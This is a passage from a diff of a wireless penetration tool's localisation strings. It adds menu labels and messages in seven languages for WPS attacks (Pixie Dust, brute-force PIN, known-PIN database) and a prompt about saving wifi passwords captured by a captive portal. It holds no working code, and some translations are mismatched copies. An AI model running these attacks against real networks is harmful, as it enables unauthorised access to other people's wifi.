-	arr["CATALAN",303]="Escriu la ruta on desarem el fitxer o prem Enter per acceptar la proposta per defecte ${normal_color}[${default_ettercap_logpath}]"
-	arr["PORTUGUESE",303]="Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar o padrão ${normal_color}[${default_ettercap_logpath}]"
-	arr["RUSSIAN",303]="Напечатайте путь до файла для сохранения или нажмите Enter для принятия предложения по умолчанию ${normal_color}[${default_ettercap_logpath}]"
-	arr["GREEK",303]="Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε Enter για την προεπιλεγμένη επιλογή ${normal_color}[${default_ettercap_logpath}]"
+	arr["ENGLISH",303]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_ettercap_logpath}]"
+	arr["SPANISH",303]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_ettercap_logpath}]"
+	arr["FRENCH",303]="Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_ettercap_logpath}]"
+	arr["CATALAN",303]="Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_ettercap_logpath}]"
+	arr["PORTUGUESE",303]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_ettercap_logpath}]"
+	arr["RUSSIAN",303]="Напечатайте путь до файла для сохранения или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${default_ettercap_logpath}]"
+	arr["GREEK",303]="Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_ettercap_logpath}]"
 
 	arr["ENGLISH",304]="Parsing sniffer log..."
 	arr["SPANISH",304]="Analizando log del sniffer.."
@@ -3006,15 +3008,15 @@ function language_strings() {
 	arr["CATALAN",316]="Es realitzarà una exploració a la recerca d'objectius..."
 	arr["PORTUGUESE",316]="Uma busca por redes wifi será realizada..."
 	arr["RUSSIAN",316]="Выполнение сканирования целей..."
-	arr["GREEK",316]="Πρόκειται να γίνει μία εξερεύνηση για έυρεση στόχων..."
+	arr["GREEK",316]="Πρόκειται να γίνει μία αναζήτηση για έυρεση στόχων..."
 
-	arr["ENGLISH",317]="If the password for the wifi network is achieved with the captive portal, you must decide where to save it. ${green_color}Type the path to store the file or press Enter to accept the default proposal ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["SPANISH",317]="Si se consigue la contraseña de la red wifi con el portal cautivo, hay que decidir donde guardarla. ${green_color}Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["FRENCH",317]="Si un mot de passe est capté sur le portail captif il faut lui assigner un endroit pour être enregistré. ${green_color}Entrez le chemin du fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["CATALAN",317]="Si s'aconsegueix la contrasenya de la xarxa wifi amb el portal captiu, cal decidir on guardar-la. ${green_color}Escriu la ruta on desarem el fitxer o prem Enter per acceptar la proposta per defecte ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["PORTUGUESE",317]="Se a senha da rede wifi for conseguida com o portal cativo, onde deseja salvar? ${green_color}Digite um caminho para salvar o arquivo ou pressione Enter para aceitar o padrão ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["RUSSIAN",317]="Вы должны решить, где будет сохранён пароль wifi сети, если он будет получен Перехватывающим порталом. ${green_color}Впишите путь до файла или нажмите Enter для принятия значения по умолчанию ${normal_color}[${default_et_captive_portal_logpath}]"
-	arr["GREEK",317]="Εάν ο κωδικός πρόσβασης του δικτύου wifi επιτευχθεί με captive portal, θα πρέπει να αποφασίσετε που θα τον αποθηκεύσετε. ${green_color}Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε Enter για την προεπιλεγμένη επιλογή ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["ENGLISH",317]="If the password for the wifi network is achieved with the captive portal, you must decide where to save it. ${green_color}Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["SPANISH",317]="Si se consigue la contraseña de la red wifi con el portal cautivo, hay que decidir donde guardarla. ${green_color}Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["FRENCH",317]="Si un mot de passe est capté sur le portail captif il faut lui assigner un endroit pour être enregistré. ${green_color}Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["CATALAN",317]="Si s'aconsegueix la contrasenya de la xarxa wifi amb el portal captiu, cal decidir on guardar-la. ${green_color}Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["PORTUGUESE",317]="Se a senha da rede wifi for conseguida com o portal cativo, onde deseja salvar? ${green_color}Digite um caminho para salvar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["RUSSIAN",317]="Вы должны решить, где будет сохранён пароль wifi сети, если он будет получен Перехватывающим порталом. ${green_color}Впишите путь до файла или нажмите [Enter] для принятия значения по умолчанию ${normal_color}[${default_et_captive_portal_logpath}]"
+	arr["GREEK",317]="Εάν ο κωδικός πρόσβασης του δικτύου wifi επιτευχθεί με captive portal, θα πρέπει να αποφασίσετε που θα τον αποθηκεύσετε. ${green_color}Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_et_captive_portal_logpath}]"
 
 	arr["ENGLISH",318]="Choose the language in which network clients will see the captive portal :"
 	arr["SPANISH",318]="Elige el idioma en el que los clientes de la red verán el portal cautivo :"
@@ -3135,6 +3137,318 @@ function language_strings() {
 	arr["PORTUGUESE",332]="Idioma alterado para Grego"
 	arr["RUSSIAN",332]="Язык изменён на Греческий"
 	arr["GREEK",332]="Η γλώσσα άλλαξε σε Ελληνικά"
+
+	arr["ENGLISH",333]="8.  WPS attacks menu"
+	arr["SPANISH",333]="8.  Menú de ataques WPS"
+	arr["FRENCH",333]="${pending_of_translation} 8.  Menu des attaques WPS"
+	arr["CATALAN",333]="${pending_of_translation} 8.  Menú d'atacs WPS"
+	arr["PORTUGUESE",333]="${pending_of_translation} 8.  Menu de ataques WPS"
+	arr["RUSSIAN",333]="8.  Меню атак на WPS"
+	arr["GREEK",333]="8.  Μενού επιθέσεων WPS"
+
+	arr["ENGLISH",334]="WPS attacks menu"
+	arr["SPANISH",334]="Menú de ataques WPS"
+	arr["FRENCH",334]="${pending_of_translation} Menu des attaques WPS"
+	arr["CATALAN",334]="${pending_of_translation} Menú d'atacs WPS"
+	arr["PORTUGUESE",334]="${pending_of_translation} Menu de ataques WPS"
+	arr["RUSSIAN",334]="Меню атак на WPS"
+	arr["GREEK",334]="Μενού επιθέσεων WPS"
+
+	arr["ENGLISH",335]="Selected WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
+	arr["SPANISH",335]="WPS BSSID seleccionado: ${pink_color}${wps_bssid}${normal_color}"
+	arr["FRENCH",335]="${pending_of_translation} WPS BSSID sélectionné: ${pink_color}${wps_bssid}${normal_color}"
+	arr["CATALAN",335]="${pending_of_translation} WPS BSSID seleccionat: ${pink_color}${wps_bssid}${normal_color}"
+	arr["PORTUGUESE",335]="${pending_of_translation} WPS BSSID selecionado: ${pink_color}${wps_bssid}${normal_color}"
+	arr["RUSSIAN",335]="Выбран WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
+	arr["GREEK",335]="Επιλεγμένο WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
+
+	arr["ENGLISH",336]="Selected WPS channel: ${pink_color}${wps_channel}${normal_color}"
+	arr["SPANISH",336]="WPS Canal seleccionado: ${pink_color}${wps_channel}${normal_color}"
+	arr["FRENCH",336]="${pending_of_translation} WPS Canal sélectionné: ${pink_color}${wps_channel}${normal_color}"
+	arr["CATALAN",336]="${pending_of_translation} WPS Canal seleecionat: ${pink_color}${wps_channel}${normal_color}"
+	arr["PORTUGUESE",336]="${pending_of_translation} WPS Canal selecionado: ${pink_color}${wps_channel}${normal_color}"
+	arr["RUSSIAN",336]="Выбран WPS канал: ${pink_color}${wps_channel}${normal_color}"
+	arr["GREEK",336]="Επιλεγμένο WPS κανάλι: ${pink_color}${wps_channel}${normal_color}"
+
+	arr["ENGLISH",337]="Selected WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- can't be used"
+	arr["SPANISH",337]="WPS ESSID seleccionado: ${pink_color}${wps_essid}${blue_color} <- no se puede usar"
+	arr["FRENCH",337]="${pending_of_translation} WPS ESSID sélectionné: ${pink_color}${wps_essid}${blue_color} <- ne peut pas être utilisé"
+	arr["CATALAN",337]="${pending_of_translation} WPS ESSID seleccionat: ${pink_color}${wps_essid}${blue_color} <- no es pot utilitzar"
+	arr["PORTUGUESE",337]="${pending_of_translation} WPS ESSID selecionado: ${pink_color}${wps_essid}${blue_color} <- não pode ser utilizada"
+	arr["RUSSIAN",337]="Выбран WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- не может использоваться"
+	arr["GREEK",337]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- δεν μπορεί να χρησιμοποιηθεί"
+
+	arr["ENGLISH",338]="Selected WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
+	arr["SPANISH",338]="WPS ESSID seleccionado: ${pink_color}${wps_essid}${normal_color}"
+	arr["FRENCH",338]="${pending_of_translation} WPS ESSID sélectionné: ${pink_color}${wps_essid}${normal_color}"
+	arr["CATALAN",338]="${pending_of_translation} WPS ESSID seleccionat: ${pink_color}${wps_essid}${normal_color}"
+	arr["PORTUGUESE",338]="${pending_of_translation} WPS ESSID selecionado: ${pink_color}${wps_essid}${normal_color}"
+	arr["RUSSIAN",338]="Выбран WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
+	arr["GREEK",338]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
+
+	arr["ENGLISH",339]="Selected WPS BSSID: ${pink_color}None${normal_color}"
+	arr["SPANISH",339]="WPS BSSID seleccionado: ${pink_color}Ninguno${normal_color}"
+	arr["FRENCH",339]="${pending_of_translation} WPS BSSID sélectionné: ${pink_color}Aucun${normal_color}"
+	arr["CATALAN",339]="${pending_of_translation} WPS BSSID seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["PORTUGUESE",339]="${pending_of_translation} WPS BSSID selecionado: ${pink_color}Nenhum${normal_color}"
+	arr["RUSSIAN",339]="Выбран WPS BSSID: ${pink_color}Нет${normal_color}"
+	arr["GREEK",339]="Επιλεγμένο WPS BSSID: ${pink_color}Κανένα${normal_color}"
+
+	arr["ENGLISH",340]="Selected WPS channel: ${pink_color}None${normal_color}"
+	arr["SPANISH",340]="WPS Canal seleccionado: ${pink_color}Ninguno${normal_color}"
+	arr["FRENCH",340]="${pending_of_translation} WPS Canal sélectionné: ${pink_color}Aucun${normal_color}"
+	arr["CATALAN",340]="${pending_of_translation} WPS Canal seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["PORTUGUESE",340]="${pending_of_translation} WPS Canal selecionado: ${pink_color}Nenhum${normal_color}"
+	arr["RUSSIAN",340]="Выбран WPS канал: ${pink_color}Нет${normal_color}"
+	arr["GREEK",340]="Επιλεγμένο WPS κανάλι: ${pink_color}Κανένα${normal_color}"
+
+	arr["ENGLISH",341]="Selected WPS ESSID: ${pink_color}None${normal_color}"
+	arr["SPANISH",341]="WPS ESSID seleccionado: ${pink_color}Ninguno${normal_color}"
+	arr["FRENCH",341]="${pending_of_translation} WPS ESSID sélectionné: ${pink_color}Aucun${normal_color}"
+	arr["CATALAN",341]="${pending_of_translation} WPS ESSID seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["PORTUGUESE",341]="${pending_of_translation} WPS ESSID selecionado: ${pink_color}Nenhum${normal_color}"
+	arr["RUSSIAN",341]="Выбран WPS ESSID: ${pink_color}Нет${normal_color}"
+	arr["GREEK",341]="Επιλεγμένο WPS ESSID: ${pink_color}Κανένα${normal_color}"
+
+	arr["ENGLISH",342]="Pixie Dust attack obtains PIN and password in seconds, but not all access points are affected"
+	arr["SPANISH",342]="El ataque Pixie Dust obtiene el PIN y la clave en segundos, pero no todos los puntos de acceso son vulnerables a este ataque"
+	arr["FRENCH",342]="${pending_of_translation} L'attaque Pixie Dust obtient le code PIN et le mot de passe en quelques secondes, mais les points d'accès ne sont pas tous vulnérables à cette attaque"
+	arr["CATALAN",342]="${pending_of_translation} L'atac Pixie Dust obté el PIN i la clau en segons, però no tots els punts d'accés són vulnerables a aquest atac"
+	arr["PORTUGUESE",342]="${pending_of_translation} O ataque Pixie Dust recebe o PIN e senha em segundos, mas nem todos os pontos de acesso são vulneráveis a este ataque"
+	arr["RUSSIAN",342]="Pixie Dust получает PIN и пароль за секунды, но не все точки доступа подвержены этой атаке"
+	arr["GREEK",342]="Η επίθεση Pixie Dust αποκτά το PIN και τον κωδικό πρόσβασης σε δευτερόλεπτα, αλλά μερικά σημεία πρόσβασης δεν επηρεάζονται"
+
+	arr["ENGLISH",343]="In order to success on any WPS based attack, you need good signal of target network. We might otherwise get false negatives"
+	arr["SPANISH",343]="Para realizar cualquier ataque WPS es necesario tener una buena señal de la red objetivo. Si no, podríamos obtener falsos negativos"
+	arr["FRENCH",343]="${pending_of_translation} Pour effectuer toute WPS attaque dont vous avez besoin d'un bon signe du réseau cible. Nous pourrions obtenir autrement faux négatifs"
+	arr["CATALAN",343]="${pending_of_translation} Per realitzar qualsevol atac WPS cal tenir un bon senyal de la xarxa objectiu. Si no, podríem obtenir falsos negatius"
+	arr["PORTUGUESE",343]="${pending_of_translation} Para executar qualquer WPS atacar você precisa de um bom sinal da rede alvo. Que poderiam obter falsos negativos"
+	arr["RUSSIAN",343]="Чтобы добиться успеха при любой WPS атаке, вам нужен хорошей сигнал целевой сети. В противном случае мы можем получить ложные срабатывания"
+	arr["GREEK",343]="Για να εκτελεστεί επιτυχώς οποιαδήποτε επίθεση WPS, θα πρέπει να υπάρχει ισχυρό σήμα του δικτύου στόχου. Αλλιώς μπορεί να υπάρξουν ψευδώς αρνητικά αποτελέσματα"
+
+	arr["ENGLISH",344]="Some access points can be blocked after failing some PIN connection attempts. It may vary depending on the access point"
+	arr["SPANISH",344]="Algunos puntos de acceso se bloquean tras fallar cierto número de intentos de conexión por PIN. Puede variar dependiendo del punto de acceso"
+	arr["FRENCH",344]="${pending_of_translation} Certains points d'accès sont bloqués après avoir raté un certain nombre de tentatives de connexion par code PIN. Elle peut varier en fonction du point d'accès"
+	arr["CATALAN",344]="${pending_of_translation} Alguns punts d'accés es bloqueja després de fallar cert nombre d'intents de connexió per PIN. Pot variar depenent del punt d'accés"
+	arr["PORTUGUESE",344]="${pending_of_translation} Alguns pontos de acesso estão bloqueadas depois de perder uma série de tentativas de conexão por PIN. Ela pode variar dependendo do ponto de acesso"
+	arr["RUSSIAN",344]="Некоторые точки доступа блокируются после нескольких неудачных попыток подключения с PIN. Это зависит от конкретной точки доступа."
+	arr["GREEK",344]="Μερικά σημεία πρόσβασης μπορεί να μπλοκαριστούν μετά από μερικές αποτυχημένες προσπάθειες σύνδεσης PIN. Μπορεί να διαφέρει ανάλογα με το σημείο πρόσβασης"
+
+	arr["ENGLISH",345]="5.  (bully) Custom PIN association"
+	arr["SPANISH",345]="5.  (bully) Asociación con PIN personalizado"
+	arr["FRENCH",345]="${pending_of_translation} 5.  (bully) Association avec le code PIN personnalisé"
+	arr["CATALAN",345]="${pending_of_translation} 5.  (bully) Associació amb PIN personalitzat"
+	arr["PORTUGUESE",345]="${pending_of_translation} 5.  (bully) Associação com o PIN personalizado"
+	arr["RUSSIAN",345]="5.  (bully) Ассоциация с персонализированным PIN"
+	arr["GREEK",345]="5.  (bully) Σύνδεση με εξατομικευμένο PIN"
+
+	arr["ENGLISH",346]="7.  (bully) Pixie Dust attack"
+	arr["SPANISH",346]="7.  (bully) Ataque Pixie Dust"
+	arr["FRENCH",346]="${pending_of_translation} 7.  (bully) Attaque Pixie Dust"
+	arr["CATALAN",346]="${pending_of_translation} 7.  (bully) Atac Pixie Dust"
+	arr["PORTUGUESE",346]="${pending_of_translation} 7.  (bully) Ataque Pixie Dust"
+	arr["RUSSIAN",346]="7.  (bully) Атака Pixie Dust"
+	arr["GREEK",346]="7.  (bully) Επίθεση Pixie Dust"
+
+	arr["ENGLISH",347]="9.  (bully) Bruteforce PIN attack"
+	arr["SPANISH",347]="9.  (bully) Ataque de fuerza bruta por PIN"
+	arr["FRENCH",347]="${pending_of_translation} 9.  (bully) Attaque de force brute PIN"
+	arr["CATALAN",347]="${pending_of_translation} 9.  (bully) Atac de força bruta per PIN"
+	arr["PORTUGUESE",347]="${pending_of_translation} 9.  (bully) Ataque força bruta PIN"
+	arr["RUSSIAN",347]="9.  (bully) Атака перебором PIN"
+	arr["GREEK",347]="9.  (bully) Επίθεση PIN με χρήση ωμής βίας"
+
+	arr["ENGLISH",348]="11. (bully) Known PINs database based attack"
+	arr["SPANISH",348]="11. (bully) Ataque basado en base de datos de PINs conocidos"
+	arr["FRENCH",348]="${pending_of_translation} 11. (bully) Sur la base base de données d'attaque PINs connus"
+	arr["CATALAN",348]="${pending_of_translation} 11. (bully) Atac basat en base de dades de PINs coneguts"
+	arr["PORTUGUESE",348]="${pending_of_translation} 11. (bully) Banco de dados de ataque com base de PINs conhecidos"
+	arr["RUSSIAN",348]="11. (bully) Атака на основе базы данных известных PIN"
+	arr["GREEK",348]="11. (bully) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"
+
+	arr["ENGLISH",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"
+	arr["SPANISH",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
+	arr["FRENCH",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
+	arr["CATALAN",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
+	arr["PORTUGUESE",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
+	arr["RUSSIAN",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"
+	arr["GREEK",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"
+
+	arr["ENGLISH",350]="${blue_color}You have selected a locked WPS network ${green_color}Do you want to continue? ${normal_color}[y/n]"
+	arr["SPANISH",350]="${blue_color}Has seleccionado una red WPS bloqueada ${green_color}¿Deseas continuar? ${normal_color}[y/n]"
+	arr["FRENCH",350]="${pending_of_translation} ${blue_color}Vous avez sélectionné un réseau WPS bloqué ${green_color}Voulez-vous continuer? ${normal_color}[y/n]"
+	arr["CATALAN",350]="${pending_of_translation} ${blue_color}Has seleccionat una xarxa WPS bloquejada ${green_color}¿Vols continuar? ${normal_color}[y/n]"
+	arr["PORTUGUESE",350]="${pending_of_translation} ${blue_color}Você selecionou uma rede WPS bloqueada ${green_color}Você deseja continuar? ${normal_color}[y/n]"
+	arr["RUSSIAN",350]="${blue_color}Вы выбрали заблокированную WPS сеть ${green_color}Вы хотите продолжить? ${normal_color}[y/n]"
+	arr["GREEK",350]="${blue_color}Έχετε επιλέξει ένα κλειδωμένο WPS δίκτυο ${green_color}Θέλετε να συνεχίσετε; ${normal_color}[y/n]"
+
+	arr["ENGLISH",351]="WPS locked network: ${pink_color}${wps_locked}${normal_color}"
+	arr["SPANISH",351]="WPS red bloqueada: ${pink_color}${wps_locked}${normal_color}"
+	arr["FRENCH",351]="${pending_of_translation} WPS réseau bloqué: ${pink_color}${wps_locked}${normal_color}"
+	arr["CATALAN",351]="${pending_of_translation} WPS xarxa bloquejada: ${pink_color}${wps_locked}${normal_color}"
+	arr["PORTUGUESE",351]="${pending_of_translation} WPS rede bloqueada: ${pink_color}${wps_locked}${normal_color}"
+	arr["RUSSIAN",351]="Сеть с заблокированным WPS: ${pink_color}${wps_locked}${normal_color}"
+	arr["GREEK",351]="Κλειδωμένο WPS δίκτυο: ${pink_color}${wps_locked}${normal_color}"
+
+	arr["ENGLISH",352]="WPS locked network: ${pink_color}None${normal_color}"
+	arr["SPANISH",352]="WPS red bloqueada: ${pink_color}Ninguno${normal_color}"
+	arr["FRENCH",352]="${pending_of_translation} WPS réseau bloqué: ${pink_color}Aucun${normal_color}"
+	arr["CATALAN",352]="${pending_of_translation} WPS xarxa bloquejada: ${pink_color}Ningú${normal_color}"
+	arr["PORTUGUESE",352]="${pending_of_translation} WPS rede bloqueada: ${pink_color}Nenhum${normal_color}"
+	arr["RUSSIAN",352]="Сеть с заблокированным WPS: ${pink_color}Нет${normal_color}"
+	arr["GREEK",352]="Κλειδωμένο WPS δίκτυο: ${pink_color}Κανένα${normal_color}"
+
+	arr["ENGLISH",353]="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."
+	arr["SPANISH",353]="Realizando una pequeña prueba para solventar el posible problema de \"bad FCS\" si existiese. Parametrizando..."
+	arr["FRENCH",353]="${pending_of_translation} Faire un petit test pour résoudre le problème possible de \"bad FCS\" si. Paramétrage..."
+	arr["CATALAN",353]="${pending_of_translation} Mitjançant una petita prova per solucionar el possible problema de \"bad FCS\" si existís. Parametritzant..."
+	arr["PORTUGUESE",353]="${pending_of_translation} Fazendo um pouco de teste para resolver o possível problema de \"bad FCS\" se houver. Parametrizando..."
+	arr["RUSSIAN",353]="Проверка возможного решения проблемы \"плохого FCS (контроля последовательности кадров)\" если она существует. Параметризация..."
+	arr["GREEK",353]="Γίνεται έλεγχος επίλυσης πιθανού σφάλματος \"bad FCS\" αν υπάρχει. Γίνεται παραμετροποίηση..."
+
+	arr["ENGLISH",354]="Done! parameter set"
+	arr["SPANISH",354]="Hecho! parámetro fijado"
+	arr["FRENCH",354]="${pending_of_translation} Fait! paramètre fixe"
+	arr["CATALAN",354]="${pending_of_translation} Fet! paràmetre fixat"
+	arr["PORTUGUESE",354]="${pending_of_translation} Feito! parâmetro fixo"
+	arr["RUSSIAN",354]="Сделано! параметры заданы"
+	arr["GREEK",354]="Έγινε! η παράμετρος τέθηκε"
+
+	arr["ENGLISH",355]="It seems this interface was parametrized before. It's not necessary to check again"
+	arr["SPANISH",355]="Esta interfaz ya fue parametrizada anteriormente. No es necesario realizar de nuevo el chequeo"
+	arr["FRENCH",355]="${pending_of_translation} Fait! paramètre fixe"
+	arr["CATALAN",355]="${pending_of_translation} Fet! paràmetre fixat"
+	arr["PORTUGUESE",355]="${pending_of_translation} Feito! parâmetro fixo"
+	arr["RUSSIAN",355]="Кажется, этот интерфейс был параметризован ранее. Нет необходимости проверять снова"
+	arr["GREEK",355]="Φαίνεται πως αυτή η διεπαφή παραμετροποιήθηκε προηγουμένως. Δεν είναι απαραίτητο να γίνει έλεγχος ξανά"
+
+	arr["ENGLISH",356]="Some combinations don't work well. Such as reaver and Ralink chipset cards. If your card has this chipset is recommended to use bully"
+	arr["SPANISH",356]="Algunas combinaciones no funcionan bien. Como por ejemplo reaver y las tarjetas con chipset Ralink. Si tu tarjeta tiene este chipset es mejor utilizar bully"
+	arr["FRENCH",356]="${pending_of_translation} Certaines combinaisons ne fonctionnent pas bien. Tels que reaver et cartes avec Ralink chipset. Si votre carte a ce chipset est préférable d'utiliser bully"
+	arr["CATALAN",356]="${pending_of_translation} Algunes combinacions no funcionan bé. Com per exemple reaver i les targetes amb chipset Ralink. Si la teva targeta té aquest chipset és millor utilitzar bully"
+	arr["PORTUGUESE",356]="${pending_of_translation} Algumas combinações não funcionam bem. Tais como reaver e cartões com Ralink chipset. Se o seu cartão tem este chipset é melhor usar bully"
+	arr["RUSSIAN",356]="Некоторые комбинации не работают нормально. К примеру reaver и карты с чипсетом Ralink. Если ваша карта имеет этот чипсет, то рекомендуется использовать bully"
+	arr["GREEK",356]="${pending_of_translation} Μερικοί συνδυασμοί δεν λειτουργούν καλά. Όπως reaver και τις κάρτες με Ralink chipset. Αν η κάρτα σας έχει αυτό το chipset είναι καλύτερο να χρησιμοποιήσετε bully"
+
+	arr["ENGLISH",357]="6.  (reaver) Custom PIN association"
+	arr["SPANISH",357]="6.  (reaver) Asociación con PIN personalizado"
+	arr["FRENCH",357]="${pending_of_translation} 6.  (reaver) Association avec le code PIN personnalisé"
+	arr["CATALAN",357]="${pending_of_translation} 6.  (reaver) Associació amb PIN personalitzat"
+	arr["PORTUGUESE",357]="${pending_of_translation} 6.  (reaver) Associação com o PIN personalizado"
+	arr["RUSSIAN",357]="6.  (reaver) Пользовательские PIN ассоциации"
+	arr["GREEK",357]="6.  (reaver) Σύνδεση με εξατομικευμένο PIN"
+
+	arr["ENGLISH",358]="8.  (reaver) Pixie Dust attack"
+	arr["SPANISH",358]="8.  (reaver) Ataque Pixie Dust"
+	arr["FRENCH",358]="${pending_of_translation} 8.  (reaver) Attaque Pixie Dust"
+	arr["CATALAN",358]="${pending_of_translation} 8.  (reaver) Atac Pixie Dust"
+	arr["PORTUGUESE",358]="${pending_of_translation} 8.  (reaver) Ataque Pixie Dust"
+	arr["RUSSIAN",358]="8.  (reaver) Атака Pixie Dust"
+	arr["GREEK",358]="8.  (reaver) Επίθεση Pixie Dust"
+
+	arr["ENGLISH",359]="10. (reaver) Bruteforce PIN attack"
+	arr["SPANISH",359]="10. (reaver) Ataque de fuerza bruta por PIN"
+	arr["FRENCH",359]="${pending_of_translation} 10. (reaver) Attaque de force brute PIN"
+	arr["CATALAN",359]="${pending_of_translation} 10. (reaver) Atac de força bruta per PIN"
+	arr["PORTUGUESE",359]="${pending_of_translation} 10. (reaver) Ataque força bruta PIN"
+	arr["RUSSIAN",359]="10. (reaver) Атака перебором PIN"
+	arr["GREEK",359]="10. (reaver) Επίθεση PIN με χρήση ωμής βίας"
+
+	arr["ENGLISH",360]="12. (reaver) Known PINs database based attack"
+	arr["SPANISH",360]="12. (reaver) Ataque basado en base de datos de PINs conocidos"
+	arr["FRENCH",360]="${pending_of_translation} 12. (reaver) Sur la base base de données d'attaque PINs connus"
+	arr["CATALAN",360]="${pending_of_translation} 12. (reaver) Atac basat en base de dades de PINs coneguts"
+	arr["PORTUGUESE",360]="${pending_of_translation} 12. (reaver) Banco de dados de ataque com base de PINs conhecidos"
+	arr["RUSSIAN",360]="12. (reaver) Атака на основе базы данных известных PIN"
+	arr["GREEK",360]="12. (reaver) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"
+
+	arr["ENGLISH",361]="13.  Return to main menu"
+	arr["SPANISH",361]="13.  Volver al menú principal"
+	arr["FRENCH",361]="13.  Retourner au menu principal"
+	arr["CATALAN",361]="13.  Tornar al menú principal"
+	arr["PORTUGUESE",361]="13.  Voltar ao menu principal"
+	arr["RUSSIAN",361]="13.  Возврат в главное меню"
+	arr["GREEK",361]="13.  Επιστροφή στο αρχικό μενού"
+
+	arr["ENGLISH",362]="Custom PIN set to ${normal_color}${custom_pin}"
+	arr["SPANISH",362]="PIN personalizado elegido ${normal_color}${custom_pin}"
+	arr["FRENCH",362]="${pending_of_translation} PIN personnalisé choisi ${normal_color}${custom_pin}"
+	arr["CATALAN",362]="${pending_of_translation} PIN personalitzat triat ${normal_color}${custom_pin}"
+	arr["PORTUGUESE",362]="${pending_of_translation} PIN personalizado escolhido ${normal_color}${custom_pin}"
+	arr["RUSSIAN",362]="Пользовательский PIN установлен на ${normal_color}${custom_pin}"
+	arr["GREEK",362]="${pending_of_translation} εξατομικευμένες PIN επιλεγεί ${normal_color}${custom_pin}"
+
+	arr["ENGLISH",363]="Type custom PIN :"
+	arr["SPANISH",363]="Escribe el PIN personalizado :"
+	arr["FRENCH",363]="${pending_of_translation} Écrivez l'ESSID du réseau cible :"
+	arr["CATALAN",363]="${pending_of_translation} Escriu el ESSID objectiu :"
+	arr["PORTUGUESE",363]="${pending_of_translation} Escreva o ESSID do alvo :"
+	arr["RUSSIAN",363]="Напишите пользовательский PIN :"
+	arr["GREEK",363]="${pending_of_translation} Πληκτρολογήστε ESSID στόχου :"
+
+	arr["ENGLISH",364]="BSSID set to ${normal_color}${wps_bssid}"
+	arr["SPANISH",364]="BSSID elegido ${normal_color}${wps_bssid}"
+	arr["FRENCH",364]="Le BSSID choisi est ${normal_color}${wps_bssid}"
+	arr["CATALAN",364]="El BSSID escollit ${normal_color}${wps_bssid}"
+	arr["PORTUGUESE",364]="BSSID escolhido ${normal_color}${wps_bssid}"
+	arr["RUSSIAN",364]="BSSID установлена на ${normal_color}${wps_bssid}"
+	arr["GREEK",364]="Το BSSID τέθηκε σε ${normal_color}${wps_bssid}"
+
+	arr["ENGLISH",365]="Channel set to ${normal_color}${wps_channel}"
+	arr["SPANISH",365]="Canal elegido ${normal_color}${wps_channel}"
+	arr["FRENCH",365]="Le canal ${normal_color}${wps_channel}${blue_color} a été choisi"
+	arr["CATALAN",365]="El canal ${normal_color}${wps_channel}${blue_color} s'ha escollit"
+	arr["PORTUGUESE",365]="Canal ${normal_color}${wps_channel}${blue_color} selecionado"
+	arr["RUSSIAN",365]="Канал установлен на ${normal_color}${wps_channel}"
+	arr["GREEK",365]="Το κανάλι ${normal_color}${wps_channel}${blue_color} έχει επιλεχθεί"
+
+	arr["ENGLISH",366]="After stopping the attack (using Ctrl+C), the window will not be closed automatically. So you'll have time to write down the password if successful. You'll have to close it manually"
